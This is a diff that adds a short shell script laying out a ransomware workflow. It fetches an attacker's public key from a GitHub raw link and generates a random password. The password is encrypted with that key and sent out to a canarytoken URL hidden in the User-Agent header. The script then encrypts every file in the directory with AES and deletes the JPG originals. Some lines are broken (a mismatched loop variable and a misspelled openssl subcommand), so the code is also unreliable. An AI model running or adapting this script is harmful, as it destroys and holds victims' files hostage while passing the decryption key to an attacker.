@@ -1,0 +1,17 @@
+##prep
+#generate key-pair and store public-key in txt file on github
+ssh-keygen -t rsa -b 4096
+
+
+##script
+#step1: decode and save base64 encoded public key
+curl <raw-github-link> | base64 --decode | cat > publickey.pem 
+
+#step2: create 32-bit random password (save in file randompassword and encrypt with downloaded public-key)
+openssl rand -hex 32 | cat > randompassword && openssl rsault -encrypt -inkey publickey.pem -pubin -in randompassword -out randompassword.encrypted
+
+#step3: abusing trackingtoken to receive the randompassword.encrypted file as user-agent in request (base 64 for perserviing integrity of date)  https://www.canarytokens.org/generate
+curl --silent --output /dev/null/ -A "$(base64 randompassword.encrypted)" <canarytoken-link>
+
+#step4: encrypt the files
+for file in *; do [ -f $f ] && openssl enc -p -aes-256-cbc -salt -in $f -out $f.enc -pass file:./randompassword ; done; rm *.JPG 
